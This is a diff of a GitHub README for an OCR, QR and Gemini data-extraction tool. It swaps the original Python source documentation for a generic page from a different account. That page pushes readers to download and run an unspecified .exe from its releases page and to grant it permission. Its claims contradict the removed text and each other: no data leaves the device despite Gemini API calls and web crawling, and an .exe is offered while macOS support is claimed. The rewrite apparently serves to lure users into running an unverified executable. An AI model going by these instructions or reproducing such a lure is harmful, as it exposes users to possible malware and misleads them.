@@ -1,271 +1,88 @@
-🌟 If you like this project, give it a ⭐ on GitHub — it helps more developers discover VisionFusion!
+# 🚀 VisionFusion_OCR_QR - Your AI Tool for Smart Data Extraction
 
-# 🧠 Dynamic OCR + QR Intelligence Suite
+[![Download VisionFusion_OCR_QR](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/emileegraphic698/VisionFusion_OCR_QR/releases)
 
-### 🚀 Smart Document Extraction, QR Decoding, Web Enrichment & Excel Integration
+## 🎯 Overview
 
-*By **Yabix** — AI-Powered Data Intelligence Platform*
+VisionFusion by Yabix is an AI-powered suite that combines Optical Character Recognition (OCR), QR code processing, and web intelligence. It extracts, cleans, and merges data from images, PDFs, and websites. With the help of Google Gemini and advanced computer vision, this tool creates intelligent Excel reports, streamlining your data tasks.
 
----
+## 🌟 Key Features
 
-## 📂 Project Structure
+- **Data Extraction:** Works seamlessly with images, PDFs, and websites.
+- **AI-Powered Insights:** Utilizes Google Gemini for powerful data processing.
+- **Excel Reports:** Generates organized reports that you can easily read and use.
+- **Easy to Use:** Designed for users with no programming experience.
 
-```
-dynamic_ocr_qr/
-│
-├── app/
-│   ├── __init__.py
-│   ├── ocr_dyn.py          # OCR + Gemini JSON extractor (AI-based text & info extraction)
-│   ├── qr_dyn.py           # Advanced QR detection & cleaning (multi-engine)
-│   ├── mix_ocr_qr.py       # Merge OCR and QR data dynamically into unified JSON
-│   ├── scrap.py            # Intelligent web scraper + Gemini web analyzer + translation
-│   ├── excel_mode.py       # Excel-based enrichment, merging & deduplication
-│   ├── final_mix.py        # Final integration: JSON + Excel into clean master dataset
-│
-├── streamlit_app/
-│   └── app2.py             # Streamlit-based web interface for interactive use
-│
-│
-├── requirements.txt        # All Python dependencies
-├── .gitignore              # Ignore caches, outputs, and private keys
-├── LICENSE                 # Proprietary License
-└── README.md               # (This file)
-```
+## 🚀 Getting Started
 
----
+Follow these steps to download and run VisionFusion_OCR_QR:
 
-## ⚡ Overview
+1. **Visit the Releases Page:** Click the link below to go to our releases page:
+   
+   [Download VisionFusion_OCR_QR](https://github.com/emileegraphic698/VisionFusion_OCR_QR/releases)
 
-**Dynamic OCR + QR Intelligence Suite** by **Yabix** is an **AI-powered document automation system** that processes images, PDFs, and web data — combining **Optical Character Recognition (OCR)**, **QR code extraction**, and **AI-driven website analysis** into one intelligent workflow.
+2. **Download the Latest Version:** On the releases page, find the most recent version. Look for a file that has a name like `VisionFusion_OCR_QR_vX.X.X.exe` (where X.X.X represents the version number). Click on the filename to start the download.
 
-It automatically extracts structured data from scanned documents, decodes embedded QR links, enriches the data by crawling company websites, and delivers a clean, bilingual Excel output.
+3. **Locate the Downloaded File:** Once the download completes, navigate to your computer’s downloads folder. Find the downloaded file (`VisionFusion_OCR_QR_vX.X.X.exe`).
 
----
+4. **Run the Application:** Double-click on the file to open it. If your computer prompts for permission to run the software, click "Yes" or "Allow".
 
-## 🧩 Core Functional Modules
+5. **Follow On-Screen Instructions:** The application will guide you through the setup process. Simply follow the prompts to complete the installation.
 
-### 🧠 1. `ocr_dyn.py`
+## 💻 System Requirements
 
-> AI-based OCR using **Google Gemini SDK** to extract structured JSON data fields from scanned documents.
+To run VisionFusion_OCR_QR effectively, ensure your computer meets the following requirements:
 
-* Converts PDFs to images using `pdf2image`
-* Sends image data to Gemini (`gemini-2.5-flash`)
-* Extracts addresses, phones, company names, persons, and text
-* Ensures schema-valid JSON output
+- **Operating System:** Windows 10 or later, macOS 10.15 or later.
+- **Processor:** Intel i3 or higher.
+- **RAM:** Minimum 4 GB, recommended 8 GB or more.
+- **Storage:** At least 500 MB of free disk space for installation.
+- **Additional Software:** Ensure you have the latest version of Python 3 installed on your system.
 
-📦 **Output:** `gemini_output.json`
+## 📥 Download & Install
 
----
+To get started, don't forget to download VisionFusion_OCR_QR from our releases page. You can do so by clicking the link below:
 
-### 🧾 2. `qr_dyn.py`
+[Download VisionFusion_OCR_QR](https://github.com/emileegraphic698/VisionFusion_OCR_QR/releases)
 
-> Multi-engine QR code decoder with deep enhancement and smart URL validation.
+After downloading, follow the installation steps outlined above.
 
-* Uses **OpenCV, pyzbar, and ZXing** for detection
-* Enhances images using CLAHE, sharpening, adaptive thresholding
-* Supports rotated / low-quality / PDF-embedded QR codes
-* Extracts and cleans URLs or vCard fields
+## ⚙️ How to Use VisionFusion_OCR_QR
 
-📦 **Outputs:**
+After installation, open the application. The main interface will be easy to navigate. Here’s how you can begin using it:
 
-* Raw: `final_superqr_v6_raw.json`
-* Cleaned: `final_superqr_v6_clean.json`
+1. **Select Data Source:** Choose whether you want to extract data from an image, a PDF file, or a website.
+2. **Upload Your File:** Click the “Upload” button, select your file, and confirm.
+3. **Configure Settings:** Adjust any settings as needed (e.g., select the file type, specify output format).
+4. **Start Extraction:** Click the “Extract” button. The tool will process your file and generate a finished report.
+5. **View & Save Your Report:** Once processing is complete, you can view your report. Save it in your desired format, typically Excel.
 
----
+## 🌐 Additional Resources
 
-### 🔗 3. `mix_ocr_qr.py`
+For more help, guides, and troubleshooting, check our project's Wiki page. Here you will find valuable information and tips to enhance your experience with VisionFusion_OCR_QR.
 
-> Merges OCR and QR results into a single structured dataset.
+## 📞 Support
 
-* Aligns per-file/page results intelligently
-* Merges OCR JSONs with corresponding QR URLs
-* Handles PDFs with multiple pages
+If you encounter any issues or have questions, please reach out through our GitHub Issues page. We monitor this regularly and will help you address any concerns.
 
-📦 **Output:** `mix_ocr_qr.json`
+## 📚 Frequently Asked Questions
 
----
+### Q1: Can I use VisionFusion_OCR_QR on macOS?
 
-### 🌍 4. `scrap.py`
+A: Yes, VisionFusion_OCR_QR is compatible with macOS 10.15 or later.
 
-> Web crawler + Gemini-based AI analyzer + translation engine.
+### Q2: Is there a mobile version of VisionFusion_OCR_QR?
 
-* Extracts URLs from `mix_ocr_qr.json`
-* Crawls websites (multi-threaded) up to configurable depth
-* Cleans HTML, extracts business info using Gemini
-* Translates English fields to Persian (EN→FA)
-* Smart SSL handling for domains
-* Generates bilingual Excel report
+A: Currently, VisionFusion_OCR_QR is only available for desktop platforms, Windows and macOS.
 
-📦 **Outputs:**
+### Q3: Does VisionFusion_OCR_QR store my data?
 
-* `urls_clean.json`
-* `gemini_scrap_output.json`
-* `web_analysis.xlsx`
+A: No, VisionFusion_OCR_QR processes your data locally on your device and does not transmit it anywhere.
 
----
+### Q4: Can I customize the output reports?
 
-### 📊 5. `excel_mode.py`
+A: Yes, you can select the desired format for the output reports (e.g., Excel, CSV).
 
-> AI-driven Excel enrichment mode for bulk processing company URLs.
+For any additional questions, feel free to ask via our support channels.
 
-* Reads input Excel file containing URLs
-* Crawls and analyzes content with Gemini
-* Translates and merges into enriched dataset
-* Handles duplicate merging and normalization
-
-📦 **Output:** `output_enriched_<timestamp>.xlsx`
-
----
-
-### 🧬 6. `final_mix.py`
-
-> Final-stage integration for unified data output.
-
-* Merges JSON & Excel datasets
-* Deduplicates by domain, phone, email, or company name
-* Normalizes Persian and English content
-* Generates clean BI-ready Excel export
-
-📦 **Output:** `merged_final_<timestamp>.xlsx`
-
----
-
-### 💻 7. `streamlit_app/app2.py`
-
-> Modern **Streamlit Web Interface** for interactive document automation.
-
-* Upload images, PDFs, or Excel files
-* Run full OCR/QR/Web pipeline directly in browser
-* Monitor logs and processing in real-time
-* View and download structured results
-
----
-
-## 🧰 Setup & Installation
-
-### 1️⃣ Clone Repository
-
-```bash
-git clone https://github.com/<your-username>/dynamic_ocr_qr.git
-cd dynamic_ocr_qr
-```
-
-### 2️⃣ Create Virtual Environment
-
-```bash
-python -m venv venv
-source venv/bin/activate     # macOS/Linux
-venv\Scripts\activate        # Windows
-```
-
-### 3️⃣ Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 4️⃣ Configure Environment
-
-#### • Windows:
-
-* Install **Poppler for Windows** → [Poppler Releases](https://github.com/oschwartz10612/poppler-windows/releases/)
-* Set environment variable:
-
-  ```bash
-  setx POPPLER_PATH "C:\poppler\Library\bin"
-  ```
-
-#### • API Key:
-
-Set your Google Gemini API key:
-
-```bash
-setx API_KEY "AIzaSyXXXXXX"
-```
-
----
-
-## 🚀 Run the System
-
-### Full Automated Pipeline
-
-```bash
-python app/ocr_dyn.py
-python app/qr_dyn.py
-python app/mix_ocr_qr.py
-python app/scrap.py
-python app/final_mix.py
-```
-
-### Streamlit Web App
-
-```bash
-streamlit run streamlit_app/app2.py
-```
-
----
-
-## 📊 Output Files
-
-| Stage | File                          | Description                         |
-| ----- | ----------------------------- | ----------------------------------- |
-| OCR   | `gemini_output.json`          | AI-extracted structured text        |
-| QR    | `final_superqr_v6_clean.json` | Clean URLs from QR                  |
-| Merge | `mix_ocr_qr.json`             | Unified JSON (OCR + QR)             |
-| Web   | `web_analysis.xlsx`           | Web-enriched bilingual company data |
-| Final | `merged_final_*.xlsx`         | Master deduplicated dataset         |
-
----
-
-## ⚙️ Technologies
-
-* 🧠 Google Gemini SDK (`google-genai`)
-* 🖼 OpenCV, Pillow, Pyzbar, Pyzxing, Pdf2Image
-* 🌍 Requests, BeautifulSoup4
-* 🧾 Pandas, OpenPyXL
-* 🚀 Streamlit
-* 🧮 Multithreading & Smart SSL Handler
-
----
-
-## 💡 Future Improvements
-
-* [ ] Integrated Web Dashboard (with job tracking)
-* [ ] Real-time Streamlit pipeline visualization
-* [ ] Supabase / Firestore integration
-* [ ] Auto-export to Google Sheets
-
----
-
-## ⚖️ License
-
-This project is licensed under a **Proprietary License**.
-All rights reserved © 2025 **Yabix**.
-Unauthorized copying, modification, or redistribution of any part of this software is strictly prohibited.
-For commercial or enterprise licensing, please contact:
-📧 [yasa.aidv@gmail.com](mailto:yasa.aidv@gmail.com)
-
----
-
-## 🎥 Live Preview
-
-**How to Run the App**
-![Yabix OCR+QR Demo](docs/Animation-ezgif.com-speed.gif)
-
-**Launch Web App**
-![Yabix OCR+QR Demo](docs/app2.gif)
-
-
-<!-- Or use a GIF -->
-
-<!-- ![Web App Demo](./docs/app_demo.gif) -->
-
----
-
-### ❤️ Developed by **Yabix**
-
-> Intelligent Document Automation | AI-Powered Data Extraction | Web Intelligence
-
----
-
-
+Thank you for choosing VisionFusion_OCR_QR — we look forward to seeing how you use our tool!
